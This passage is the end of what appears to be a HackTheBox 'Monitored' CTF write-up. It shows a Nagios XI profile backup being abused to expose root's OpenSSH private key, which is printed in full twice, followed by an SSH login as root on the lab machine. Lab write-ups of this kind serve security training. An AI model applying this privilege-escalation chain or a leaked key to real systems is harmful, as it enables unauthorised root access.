+  adding: profile-1715465825/nagios-logs/eventman.txt (deflated 98%)
+  adding: profile-1715465825/nagios-logs/sysstat.txt (deflated 91%)
+  adding: profile-1715465825/nagios-logs/cmdsubsys.txt (deflated 91%)
+  adding: profile-1715465825/nagios-logs/nagios.txt (deflated 84%)
+  adding: profile-1715465825/nagios-logs/perfdata.txt (deflated 12%)
+  adding: profile-1715465825/nagios-logs/npcd.txt (deflated 91%)
+  adding: profile-1715465825/nagios-logs/perfdataproc.txt (deflated 96%)
+  adding: profile-1715465825/maillog (stored 0%)
+  adding: profile-1715465825/xi_options_mail.txt (deflated 88%)
+  adding: profile-1715465825/xi_users.txt (deflated 71%)
+  adding: profile-1715465825/meminfo.txt (deflated 52%)
+  adding: profile-1715465825/xi_options_smtp.txt (stored 0%)
+  adding: profile-1715465825/versions/ (stored 0%)
+  adding: profile-1715465825/versions/shellinabox.txt (deflated 38%)
+  adding: profile-1715465825/versions/nrpe.txt (stored 0%)
+  adding: profile-1715465825/versions/nagvis.txt (stored 0%)
+  adding: profile-1715465825/versions/wkhtmltopdf.txt (stored 0%)
+  adding: profile-1715465825/versions/nagios.txt (deflated 40%)
+  adding: profile-1715465825/versions/npcd.txt (deflated 39%)
+  adding: profile-1715465825/versions/nagios-plugins.txt (deflated 2%)
+  adding: profile-1715465825/versions/nsca.txt (deflated 23%)
+  adding: profile-1715465825/objects.cache (deflated 88%)
+  adding: profile-1715465825/sar.txt (deflated 62%)
+  adding: profile-1715465825/1715463603.tar.gz (deflated 0%)
+  adding: profile-1715465825/phpmailer.log (deflated 24%)
+  adding: profile-1715465825/psaef.txt (deflated 83%)
+  adding: profile-1715465825/nom/ (stored 0%)
+  adding: profile-1715465825/nom/checkpoints/ (stored 0%)
+  adding: profile-1715465825/nom/checkpoints/nagioscore/ (stored 0%)
+  adding: profile-1715465825/nom/checkpoints/nagioscore/errors/ (stored 0%)
+  adding: profile-1715465825/nom/checkpoints/nagiosxi/ (stored 0%)
+  adding: profile-1715465825/nom/checkpoints/nagiosxi/1715463603_nagiosql.sql.gz (deflated 0%)
+  adding: profile-1715465825/cpuinfo.txt (deflated 69%)
+  adding: profile-1715465825/hostinfo.txt (stored 0%)
+  adding: profile-1715465825/logs/ (stored 0%)
+  adding: profile-1715465825/logs/other_vhosts_access.log.1.txt (deflated 98%)
+  adding: profile-1715465825/logs/error.log.txt (deflated 89%)
+  adding: profile-1715465825/logs/error.log.2.gz.txt (stored 0%)
+  adding: profile-1715465825/logs/snmpttsystem.txt (deflated 60%)
+  adding: profile-1715465825/logs/database_host.txt (deflated 3%)
+  adding: profile-1715465825/logs/other_vhosts_access.log.txt (deflated 97%)
+  adding: profile-1715465825/logs/other_vhosts_access.log.2.gz.txt (stored 0%)
+  adding: profile-1715465825/logs/messages.txt (deflated 85%)
+  adding: profile-1715465825/logs/access.log.txt (deflated 97%)
+  adding: profile-1715465825/logs/error.log.1.txt (deflated 57%)
+  adding: profile-1715465825/file_counts.txt (deflated 46%)
+  adding: profile-1715465825/memorybyprocess.txt (deflated 82%)
+  adding: profile-1715465825/bpi/ (stored 0%)
+  adding: profile-1715465825/bpi/bpi.conf (deflated 42%)
+Backup and Zip complete!
+</code></pre>
+
+<p>Copy the file to /tmp and unzip it:</p>
+
+<pre><code class="language-bash">nagios@monitored:/tmp$ cd /tmp/
+nagios@monitored:/tmp$ cp /usr/local/nagiosxi/var/components/profile.zip .
+Archive:  profile.zip
+   creating: profile-1715465825/
+  inflating: profile-1715465825/config.inc.php  
+  inflating: profile-1715465825/xi_usermeta.txt  
+  inflating: profile-1715465825/iptables.txt  
+  inflating: profile-1715465825/top.txt  
+  inflating: profile-1715465825/ip_addr.txt  
+  inflating: profile-1715465825/filesystem.txt  
+  inflating: profile-1715465825/ipcs.txt  
+ extracting: profile-1715465825/mrtg.tar.gz  
+   creating: profile-1715465825/nagios-logs/
+  inflating: profile-1715465825/nagios-logs/event_handler.txt  
+  inflating: profile-1715465825/nagios-logs/eventman.txt  
+  inflating: profile-1715465825/nagios-logs/sysstat.txt  
+  inflating: profile-1715465825/nagios-logs/cmdsubsys.txt  
+  inflating: profile-1715465825/nagios-logs/nagios.txt  
+  inflating: profile-1715465825/nagios-logs/perfdata.txt  
+  inflating: profile-1715465825/nagios-logs/npcd.txt  
+  inflating: profile-1715465825/nagios-logs/perfdataproc.txt  
+ extracting: profile-1715465825/maillog  
+  inflating: profile-1715465825/xi_options_mail.txt  
+  inflating: profile-1715465825/xi_users.txt  
+  inflating: profile-1715465825/meminfo.txt  
+ extracting: profile-1715465825/xi_options_smtp.txt  
+   creating: profile-1715465825/versions/
+  inflating: profile-1715465825/versions/shellinabox.txt  
+ extracting: profile-1715465825/versions/nrpe.txt  
+ extracting: profile-1715465825/versions/nagvis.txt  
+ extracting: profile-1715465825/versions/wkhtmltopdf.txt  
+  inflating: profile-1715465825/versions/nagios.txt  
+  inflating: profile-1715465825/versions/npcd.txt  
+  inflating: profile-1715465825/versions/nagios-plugins.txt  
+  inflating: profile-1715465825/versions/nsca.txt  
+  inflating: profile-1715465825/objects.cache  
+  inflating: profile-1715465825/sar.txt  
+  inflating: profile-1715465825/1715463603.tar.gz  
+  inflating: profile-1715465825/phpmailer.log  
+  inflating: profile-1715465825/psaef.txt  
+   creating: profile-1715465825/nom/
+   creating: profile-1715465825/nom/checkpoints/
+   creating: profile-1715465825/nom/checkpoints/nagioscore/
+   creating: profile-1715465825/nom/checkpoints/nagioscore/errors/
+   creating: profile-1715465825/nom/checkpoints/nagiosxi/
+  inflating: profile-1715465825/nom/checkpoints/nagiosxi/1715463603_nagiosql.sql.gz  
+  inflating: profile-1715465825/cpuinfo.txt  
+ extracting: profile-1715465825/hostinfo.txt  
+   creating: profile-1715465825/logs/
+  inflating: profile-1715465825/logs/other_vhosts_access.log.1.txt  
+  inflating: profile-1715465825/logs/error.log.txt  
+ extracting: profile-1715465825/logs/error.log.2.gz.txt  
+  inflating: profile-1715465825/logs/snmpttsystem.txt  
+  inflating: profile-1715465825/logs/database_host.txt  
+  inflating: profile-1715465825/logs/other_vhosts_access.log.txt  
+ extracting: profile-1715465825/logs/other_vhosts_access.log.2.gz.txt  
+  inflating: profile-1715465825/logs/messages.txt  
+  inflating: profile-1715465825/logs/access.log.txt  
+  inflating: profile-1715465825/logs/error.log.1.txt  
+  inflating: profile-1715465825/file_counts.txt  
+  inflating: profile-1715465825/memorybyprocess.txt  
+   creating: profile-1715465825/bpi/
+  inflating: profile-1715465825/bpi/bpi.conf  
+</code></pre>
+
+<p>View the id_rsa:</p>
+
+<pre><code>nagios@monitored:/tmp$ cat profile-1715465825/phpmailer.log
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+
+<p>And ssh as root:</p>
+
+<pre><code class="language-bash">❯ cat id_rsa
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: id_rsa
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ -----BEGIN OPENSSH PRIVATE KEY-----
+   2   │ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+   3   │ NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
+   4   │ FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
+   5   │ z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V
+   6   │ bok57e6nS9w4mj24R4ujg48NXzMyY88uhj3HwDxi097dMcN8WvIVzc+/kDPUAPm+l/8w89
+   7   │ 9MxTIZrV6uv4/iJyPiK1LtHPfhRuFI3xe6Sfy7//UxGZmshi23mvavPZ6Zq0qIOmvNTu17
+   8   │ V5wg5aAITUJ0VY9xuIhtwIAFSfgGAF4MF/P+zFYQkYLOqyVm++2hZbSLRwMymJ5iSmIo4p
+   9   │ lbxPjGZTWJ7O/pnXzc5h83N2FSG0+S4SmmtzPfGntxciv2j+F7ToMfMTd7Np9/lJv3Yb8J
+  10   │ /mxP2qnDTaI5QjZmyRJU3bk4qk9shTnOpXYGn0/hAAAFiJ4coHueHKB7AAAAB3NzaC1yc2
+  11   │ EAAAGBAJ2WJ5RttjnZ8WmivfAyTHPYrLkoIPcLYwtK9Yk85UkVYTQC7UndghUiDY9W8qnj
+  12   │ pK4ngvBba7XvvXk6735OyqWvFh9EtC7KLQEk144+EArjnJoKvSJuUg4VRu/8/WhMGt26PL
+  13   │ uOfu2/s0gyiKJVZBqIAOm9sHXuRN8JBxw1F326cECqVEafaABB31BkgyaelW6JOe3up0vc
+  14   │ OJo9uEeLo4OPDV8zMmPPLoY9x8A8YtPe3THDfFryFc3Pv5Az1AD5vpf/MPPfTMUyGa1err
+  15   │ +P4icj4itS7Rz34UbhSN8Xukn8u//1MRmZrIYtt5r2rz2ematKiDprzU7te1ecIOWgCE1C
+  16   │ dFWPcbiIbcCABUn4BgBeDBfz/sxWEJGCzqslZvvtoWW0i0cDMpieYkpiKOKZW8T4xmU1ie
+  17   │ zv6Z183OYfNzdhUhtPkuEpprcz3xp7cXIr9o/he06DHzE3ezaff5Sb92G/Cf5sT9qpw02i
+  18   │ OUI2ZskSVN25OKpPbIU5zqV2Bp9P4QAAAAMBAAEAAAGAWkfuAQEhxt7viZ9sxbFrT2sw+R
+  19   │ reV+o0IgIdzTQP/+C5wXxzyT+YCNdrgVVEzMPYUtXcFCur952TpWJ4Vpp5SpaWS++mcq/t
+  20   │ PJyIybsQocxoqW/Bj3o4lEzoSRFddGU1dxX9OU6XtUmAQrqAwM+++9wy+bZs5ANPfZ/EbQ
+  21   │ qVnLg1Gzb59UPZ51vVvk73PCbaYWtIvuFdAv71hpgZfROo5/QKqyG/mqLVep7mU2HFFLC3
+  22   │ dI0UL15F05VToB+xM6Xf/zcejtz/huui5ObwKMnvYzJAe7ViyiodtQe5L2gAfXxgzS0kpT
+  23   │ /qrvvTewkKNIQkUmCRvBu/vfaUhfO2+GceGB3wN2T8S1DhSYf5ViIIcVIn8JGjw1Ynr/zf
+  24   │ FxsZJxc4eKwyvYUJ5fVJZWSyClCzXjZIMYxAvrXSqynQHyBic79BQEBwe1Js6OYr+77AzW
+  25   │ 8oC9OPid/Er9bTQcTUbfME9Pjk9DVU/HyT1s2XH9vnw2vZGKHdrC6wwWQjesvjJL4pAAAA
+  26   │ wQCEYLJWfBwUhZISUc8IDmfn06Z7sugeX7Ajj4Z/C9Jwt0xMNKdrndVEXBgkxBLcqGmcx7
+  27   │ RXsFyepy8HgiXLML1YsjVMgFjibWEXrvniDxy2USn6elG/e3LPok7QBql9RtJOMBOHDGzk
+  28   │ ENyOMyMwH6hSCJtVkKnUxt0pWtR3anRe42GRFzOAzHmMpqby1+D3GdilYRcLG7h1b7aTaU
+  29   │ BKFb4vaeUaTA0164Wn53N89GQ+VZmllkkLHN1KVlQfszL3FrYAAADBAMuUrIoF7WY55ier
+  30   │ 050xuzn9OosgsU0kZuR/CfOcX4v38PMI3ch1IDvFpQoxsPmGMQBpBCzPTux15QtQYcMqM0
+  31   │ XVZpstqB4y33pwVWINzpAS1wv+I+VDjlwdOTrO/DJiFsnLuA3wRrlb7jdDKC/DP/I/90bx
+  32   │ 1rcSEDG4C2stLwzH9crPdaZozGHXWU03vDZNos3yCMDeKlLKAvaAddWE2R0FJr62CtK60R
+  33   │ wL2dRR3DI7+Eo2pDzCk1j9H37YzYHlbwAAAMEAxim0OTlYJOWdpvyb8a84cRLwPa+v4EQC
+  34   │ GgSoAmyWM4v1DeRH9HprDVadT+WJDHufgqkWOCW7x1I/K42CempxM1zn1iNOhE2WfmYtnv
+  35   │ 2amEWwfnTISDFY/27V7S3tpJLeBl2q40Yd/lRO4g5UOsLQpuVwW82sWDoa7KwglG3F+TIV
+  36   │ csj0t36sPw7lp3H1puOKNyiFYCvHHueh8nlMI0TA94RE4SPi3L/NVpLh3f4EYeAbt5z96C
+  37   │ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
+  38   │ -----END OPENSSH PRIVATE KEY-----
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ chmod 600 id_rsa
+❯ ssh -i id_rsa root@10.10.11.248
+Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@monitored:~#
+</code></pre>
+
+<p>And we can see the flag:</p>
+
+<pre><code class="language-bash">root@monitored:~# cat root.txt 
+5b****************************ee
+</code></pre>
+
+<p>That’s the machine, hope you liked it.</p>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>11 May 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=udp" class="tag" style="font-family: 'Cascadia Code';">udp</a>
+    
+    <a href="/search?q=snmp" class="tag" style="font-family: 'Cascadia Code';">snmp</a>
+    
+    <a href="/search?q=nagiosxi" class="tag" style="font-family: 'Cascadia Code';">nagiosxi</a>
+    
+    <a href="/search?q=api" class="tag" style="font-family: 'Cascadia Code';">api</a>
+    
+    <a href="/search?q=nagios_rce" class="tag" style="font-family: 'Cascadia Code';">nagios_rce</a>
+    
+    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
+    
+    <a href="/search?q=abusing_nagios_scripts" class="tag" style="font-family: 'Cascadia Code';">abusing_nagios_scripts</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Monitored.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Monitored.html&text=Writeup+for+HackTheBox Monitored Writeup+from+HTB+held+on+11 May 2024&hashtags=ctf,writeup,Monitored,HTB,udp,snmp,nagiosxi,api,nagios_rce,sudoers,abusing_nagios_scripts','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Monitored.html&text=Writeup+for+HackTheBox Monitored Writeup+from+HTB+held+on+2024-05-11 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('show');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
